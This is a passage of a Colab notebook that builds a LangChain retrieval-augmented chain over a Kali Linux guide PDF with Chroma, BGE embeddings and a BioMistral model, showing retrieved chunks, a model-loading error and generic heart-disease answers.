              "version_major": 2,
              "version_minor": 0,
              "model_id": "92970536beea48caa835f1dfe25be81b"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "config.json:   0%|          | 0.00/777 [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "68b03f4c4537460d8610680943e9cbd1"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "model.safetensors:   0%|          | 0.00/438M [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "ae7418b1f6634882b73fb83727368400"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "tokenizer_config.json:   0%|          | 0.00/366 [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "c883f23b659e46aa9eacac0140aeb013"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "vocab.txt:   0%|          | 0.00/232k [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "7b4b4db9e2534d51a13f12eb106c4124"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "tokenizer.json:   0%|          | 0.00/711k [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "d7f8c12895884723b95ae1e35a87ebd3"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "special_tokens_map.json:   0%|          | 0.00/125 [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "c67c0489ef294a669b448a3988ef7976"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "1_Pooling/config.json:   0%|          | 0.00/190 [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "545fe363b08942c2adf1b118421d3d3c"
            }
          },
          "metadata": {}
        }
      ],
      "source": [
        "embeddings = HuggingFaceEmbeddings(model_name=\"BAAI/bge-base-en-v1.5\")"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "cJMgeAOrQfuk"
      },
      "source": [
        "## Vector Store - FAISS or ChromaDB"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "_rMc5YphQiFA"
      },
      "outputs": [],
      "source": [
        "vectorstore = Chroma.from_documents(chunks, embeddings)"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "FmJth21AQx8V",
        "outputId": "88f8793b-c2c8-4ef9-a7ea-4ef3dc9a236e"
      },
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "<langchain_community.vectorstores.chroma.Chroma at 0x79fd9a802d40>"
            ]
          },
          "metadata": {},
          "execution_count": 19
        }
      ],
      "source": [
        "vectorstore"
      ]
    },
    {
      "cell_type": "code",
      "source": [],
      "metadata": {
        "id": "AHteGbIw4dy7"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "MxUNoeFeR7-u"
      },
      "outputs": [],
      "source": [
        "query = \"what is network\" # what is at risk of heart disease\n",
        "search = vectorstore.similarity_search(query)"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 97
        },
        "id": "45HgM9wsSCKH",
        "outputId": "fa72d2cc-a860-4018-96ed-4300249230ec"
      },
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "<IPython.core.display.Markdown object>"
            ],
            "text/markdown": ">   *  Network Scanning: To check the number of ac -\n> tive hosts on the network.\n>   *  Vulnerability scanning: Means to check the \n> weaknesses in the target so that it attacker us -\n> es those to gain the access of the target\n> So now I am going to use the universal vulner -"
          },
          "metadata": {},
          "execution_count": 40
        }
      ],
      "source": [
        "to_markdown(search[0].page_content)"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "4mVaIlkZRiXk"
      },
      "source": [
        "## Retriever"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "rK67OkSQRbnk"
      },
      "outputs": [],
      "source": [
        "retriever = vectorstore.as_retriever(\n",
        "    search_kwargs={'k': 5}\n",
        ")"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "HC4Xly8XSf26",
        "outputId": "d4145bc1-64d1-4388-ded0-dc9a1a373ddd"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "<ipython-input-34-162c3489abc9>:1: LangChainDeprecationWarning: The method `BaseRetriever.get_relevant_documents` was deprecated in langchain-core 0.1.46 and will be removed in 1.0. Use invoke instead.\n",
            "  retriever.get_relevant_documents(query)\n"
          ]
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "[Document(metadata={'page': 9, 'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf'}, page_content='Extra 03/2013 10BASICS\\nKali Linux is the latest linux distribution made \\nfor penetration testing by and used by secu -\\nrity assessors and hackers. Kali Linux is al-\\nso considered as a successor to Backtrack. Back -\\ntrack was based on Ubuntu Distribution ( www.'),\n",
              " Document(metadata={'page': 4, 'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf'}, page_content='nity support, Kali is an open source Linux distribution \\ncontaining many security tools to meet the needs of \\nHIPAA network vulnerability scans. \\nKALI LINUX  \\n– A Solution to HACKING/SECURITY 40\\nBy Deepanshu Khanna, Linux Security Researcher\\nToday is the world of technology and everyone some -'),\n",
              " Document(metadata={'page': 13, 'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf'}, page_content='•  apt-get update\\n•  apt-get upgrade\\n•  apt-get dist-upgrade\\nSummary\\nKali Linux a Debian based platform for advanced \\npenetration testing. Kali approach is good try for \\nstepping ahead into next generation of penetration \\ntesting. Researchers and developers of offensive'),\n",
              " Document(metadata={'page': 34, 'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf'}, page_content='an advanced Penetration Testing and Security Au -\\nditing Linux distribution.  It is also a complete re-\\nbuild of Backtrack, its predecessor. Kali is free ( as \\nin beer ) and contains over 300 penetration testing \\ntools. This seems like a good fit for the low-cost re -\\nquirement of the project.'),\n",
              " Document(metadata={'page': 4, 'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf'}, page_content='was Backtrack 5 R2 with codename Revolution.\\nKali Linux is the latest linux distribution made for pen -\\netration testing by and used by security assessors and \\nhackers. Kali Linux is also considered as a successor \\nto Backtrack.\\nATTACK\\nWeaponization of Android Platform  \\nusing Kali Linux 16')]"
            ]
          },
          "metadata": {},
          "execution_count": 34
        }
      ],
      "source": [
        "retriever.get_relevant_documents(query)"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "al9E1TqMS7Mq"
      },
      "source": [
        "## Large Language Model - Open Source"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "CIiVtQ17N1Pq",
        "outputId": "f2418bb2-8fdc-4df4-b404-07707d3145d7"
      },
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "Mounted at /content/drive\n"
          ]
        }
      ],
      "source": [
        "drive.mount('/content/drive')"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 1000
        },
        "id": "MKDFEMDSS9ri",
        "outputId": "7bb291c7-e302-47a4-d48d-0a9f3b377555"
      },
      "outputs": [
        {
          "ename": "ValidationError",
          "evalue": "1 validation error for LlamaCpp\n__root__\n  Could not load Llama model from path: /content/drive/MyDrive/Model&Data/BioMistral-7B.Q4_K_M.gguf. Received error Model path does not exist: /content/drive/MyDrive/Model&Data/BioMistral-7B.Q4_K_M.gguf (type=value_error)",
          "output_type": "error",
          "traceback": [
            "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
            "\u001b[0;31mValidationError\u001b[0m                           Traceback (most recent call last)",
            "\u001b[0;32m<ipython-input-30-48dd4011f93c>\u001b[0m in \u001b[0;36m<cell line: 1>\u001b[0;34m()\u001b[0m\n\u001b[0;32m----> 1\u001b[0;31m llm = LlamaCpp(\n\u001b[0m\u001b[1;32m      2\u001b[0m     \u001b[0mmodel_path\u001b[0m\u001b[0;34m=\u001b[0m \u001b[0;34m\"/content/drive/MyDrive/Model&Data/BioMistral-7B.Q4_K_M.gguf\"\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      3\u001b[0m     \u001b[0mtemperature\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0;36m0.3\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      4\u001b[0m     \u001b[0mmax_tokens\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0;36m2048\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      5\u001b[0m     top_p=1)\n",
            "\u001b[0;32m/usr/local/lib/python3.10/dist-packages/langchain_core/load/serializable.py\u001b[0m in \u001b[0;36m__init__\u001b[0;34m(self, *args, **kwargs)\u001b[0m\n\u001b[1;32m    111\u001b[0m     \u001b[0;32mdef\u001b[0m \u001b[0m__init__\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m*\u001b[0m\u001b[0margs\u001b[0m\u001b[0;34m:\u001b[0m \u001b[0mAny\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m**\u001b[0m\u001b[0mkwargs\u001b[0m\u001b[0;34m:\u001b[0m \u001b[0mAny\u001b[0m\u001b[0;34m)\u001b[0m \u001b[0;34m->\u001b[0m \u001b[0;32mNone\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    112\u001b[0m         \u001b[0;34m\"\"\"\"\"\"\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 113\u001b[0;31m         \u001b[0msuper\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m__init__\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m*\u001b[0m\u001b[0margs\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m**\u001b[0m\u001b[0mkwargs\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    114\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    115\u001b[0m     \u001b[0;34m@\u001b[0m\u001b[0mclassmethod\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.10/dist-packages/pydantic/v1/main.py\u001b[0m in \u001b[0;36m__init__\u001b[0;34m(__pydantic_self__, **data)\u001b[0m\n\u001b[1;32m    339\u001b[0m         \u001b[0mvalues\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mfields_set\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mvalidation_error\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mvalidate_model\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0m__pydantic_self__\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m__class__\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mdata\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    340\u001b[0m         \u001b[0;32mif\u001b[0m \u001b[0mvalidation_error\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 341\u001b[0;31m             \u001b[0;32mraise\u001b[0m \u001b[0mvalidation_error\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    342\u001b[0m         \u001b[0;32mtry\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    343\u001b[0m             \u001b[0mobject_setattr\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0m__pydantic_self__\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m'__dict__'\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mvalues\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;31mValidationError\u001b[0m: 1 validation error for LlamaCpp\n__root__\n  Could not load Llama model from path: /content/drive/MyDrive/Model&Data/BioMistral-7B.Q4_K_M.gguf. Received error Model path does not exist: /content/drive/MyDrive/Model&Data/BioMistral-7B.Q4_K_M.gguf (type=value_error)"
          ]
        }
      ],
      "source": [
        "llm = LlamaCpp(\n",
        "    model_path= \"/content/drive/MyDrive/Model&Data/BioMistral-7B.Q4_K_M.gguf\",\n",
        "    temperature=0.3,\n",
        "    max_tokens=2048,\n",
        "    top_p=1)"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "_dy-nCxqTQTG"
      },
      "source": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "5Y2ukOe5TS6u"
      },
      "source": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "eOm3anhXTwg-"
      },
      "source": [
        "## RAG Chain"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "M4dKOO7QUTa0"
      },
      "outputs": [],
      "source": [
        "from langchain.schema.runnable import RunnablePassthrough\n",
        "from langchain.schema.output_parser import StrOutputParser\n",
        "from langchain.prompts import ChatPromptTemplate"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "aBDfjug4U61T"
      },
      "outputs": [],
      "source": [
        "template = \"\"\"\n",
        "<|context|>\n",
        "You are an AI assistant that follows instruction extremely well.\n",
        "Please be truthful and give direct answers\n",
        "</s>\n",
        "<|user|>\n",
        "{query}\n",
        "</s>\n",
        " <|assistant|>\n",
        "\"\"\""
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "oGSLkCc7U8YI"
      },
      "outputs": [],
      "source": [
        "prompt = ChatPromptTemplate.from_template(template)"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "hLfDSrrzU1kE"
      },
      "outputs": [],
      "source": [
        "rag_chain = (\n",
        "    {\"context\": retriever,  \"query\": RunnablePassthrough()}\n",
        "    | prompt\n",
        "    | llm\n",
        "    | StrOutputParser()\n",
        ")"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "35B_JEcKVERB",
        "outputId": "fcc638a6-d721-4aab-d850-bbd2f34bdf85"
      },
      "outputs": [
        {
          "name": "stderr",
          "output_type": "stream",
          "text": [
            "Llama.generate: prefix-match hit\n",
            "\n",
            "llama_print_timings:        load time =    4075.93 ms\n",
            "llama_print_timings:      sample time =      79.20 ms /   103 runs   (    0.77 ms per token,  1300.52 tokens per second)\n",
            "llama_print_timings: prompt eval time =    9099.07 ms /    16 tokens (  568.69 ms per token,     1.76 tokens per second)\n",
            "llama_print_timings:        eval time =   87709.65 ms /   102 runs   (  859.90 ms per token,     1.16 tokens per second)\n",
            "llama_print_timings:       total time =   97416.49 ms /   118 tokens\n"
          ]
        }
      ],
      "source": [
        "response = rag_chain.invoke(\"what disease affect the heart?\")"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 97
        },
        "id": "uyor1d0xVHnW",
        "outputId": "6f8f6457-f8c7-4ea7-c0cb-d0664a3980b3"
      },
      "outputs": [
        {
          "data": {
            "text/markdown": "> The heart is affected by many diseases, some of which include coronary artery disease, cardiomyopathy, endocarditis, myocarditis, arrhythmia, congestive heart failure, atherosclerosis, hypertrophic cardiomyopathy, valvular heart disease, arrhythmogenic right ventricular cardiomyopathy, dilated cardiomyopathy, hypertension, and heart valve stenosis.",
            "text/plain": [
              "<IPython.core.display.Markdown object>"
            ]
          },
          "execution_count": 101,
          "metadata": {},
          "output_type": "execute_result"
        }
      ],
      "source": [
        "to_markdown(response)"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "background_save": true,
          "base_uri": "https://localhost:8080/"
        },
        "id": "szG5MJhzORkC",
        "outputId": "1cb65261-0c9a-4e6d-fcd9-4f2aba31da07"
      },
      "outputs": [
        {
          "name": "stderr",
          "output_type": "stream",
          "text": [
            "Llama.generate: prefix-match hit\n",
            "\n",
            "llama_print_timings:        load time =    4075.93 ms\n",
            "llama_print_timings:      sample time =     251.28 ms /   368 runs   (    0.68 ms per token,  1464.47 tokens per second)\n",
            "llama_print_timings: prompt eval time =    7480.05 ms /    14 tokens (  534.29 ms per token,     1.87 tokens per second)\n",
            "llama_print_timings:        eval time =  300823.51 ms /   367 runs   (  819.68 ms per token,     1.22 tokens per second)\n",
            "llama_print_timings:       total time =  310512.93 ms /   381 tokens\n"
          ]
        },
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "Answer:   Heart diseases refer to a group of conditions that involve the heart and blood vessels, including coronary artery disease, heart failure, arrhythmias, and congenital heart defects. Coronary artery disease is the most common type of heart disease and involves the buildup of plaque in the arteries that supply blood to the heart, which can lead to reduced blood flow and oxygen supply to the heart muscle. This can cause chest pain, shortness of breath, and other symptoms, and can increase the risk of heart attack and stroke. Heart failure is another common type of heart disease, which occurs when the heart muscle becomes weakened or damaged, causing it to pump blood less efficiently than it should. This can lead to symptoms such as fatigue, shortness of breath, swelling in the legs, and weight gain, and can increase the risk of premature death. Arrhythmias are another type of heart disease, which occur when there are abnormalities in the rate or rhythm of the heartbeat. This can cause the heart to beat too fast, too slow, or irregularly, which can lead to symptoms such as dizziness, lightheadedness, and shortness of breath, and can increase the risk of stroke, heart failure, and sudden cardiac death. Congenital heart defects are another type of heart disease, which occur when there are abnormalities in the structure of the heart present at birth. These can include defects in the valves, chambers, or great arteries, as well as abnormalities in the connections between the heart and blood vessels. Congenital heart defects can cause symptoms such as shortness of breath, fatigue, and swelling in the legs, and can increase the risk of premature death.\n"
          ]
        }
      ],
      "source": [
        "import sys\n",
        "\n",
        "while True:\n",
        "  user_input = input(f\"Input Prompt: \")\n",
        "  if user_input == 'exit':\n",
        "    print('Exiting')\n",
        "    sys.exit()\n",
        "  if user_input == '':\n",
        "    continue\n",
        "  result = rag_chain.invoke(user_input)\n",
        "  print(\"Answer: \",result)"
      ]
    }
  ],
  "metadata": {
    "accelerator": "GPU",
    "colab": {
      "gpuType": "T4",
      "provenance": [],
      "include_colab_link": true
    },
    "kernelspec": {
      "display_name": "Python 3",
      "name": "python3"
    },
    "language_info": {
      "name": "python"
    },
    "widgets": {
      "application/vnd.jupyter.widget-state+json": {
        "03c8bc2e4a9e49c3ad2b48a4e1d884c5": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_8ade15db445b4ce4bc677bdfae66f502",
              "IPY_MODEL_d0569628774e45f7a535001f0d7e06d2",
              "IPY_MODEL_14569b5374b840d4adf3e838a9603cdc"
            ],
            "layout": "IPY_MODEL_b7de15d0c0a8445c8cc68c90e5d49412"
          }
        },
        "8ade15db445b4ce4bc677bdfae66f502": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_f029673f3acc4ed58b63a06ab6218bcb",
            "placeholder": "​",
            "style": "IPY_MODEL_421127846fa14aac8f366ba19c766560",
            "value": "modules.json: 100%"
          }
        },
        "d0569628774e45f7a535001f0d7e06d2": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_d2593f17e09145b5ab5083487e0a750c",
            "max": 349,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_e8f2ce95092d47f296448e680a1bd90c",
            "value": 349
          }
        },
        "14569b5374b840d4adf3e838a9603cdc": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_8382940ef2324b16bdb9076947956201",
            "placeholder": "​",
            "style": "IPY_MODEL_fae80d2a358846ff97e8649e90b8061d",
            "value": " 349/349 [00:00&lt;00:00, 9.80kB/s]"
          }
        },
        "b7de15d0c0a8445c8cc68c90e5d49412": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "f029673f3acc4ed58b63a06ab6218bcb": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "421127846fa14aac8f366ba19c766560": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "d2593f17e09145b5ab5083487e0a750c": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "e8f2ce95092d47f296448e680a1bd90c": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "8382940ef2324b16bdb9076947956201": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "fae80d2a358846ff97e8649e90b8061d": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "5c91f47bdf614832a7cf5e167628647a": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_7130b281873f4090a78160d671b6ffee",
              "IPY_MODEL_dc786198a6ce42d7b9e4f367175c771c",
              "IPY_MODEL_58f067c4351e41179c6332357612dc3d"
            ],
            "layout": "IPY_MODEL_a3a75168199f4be080003b0b844b1d2d"
          }
        },
        "7130b281873f4090a78160d671b6ffee": {
          "model_module": "@jupyter-widgets/controls",
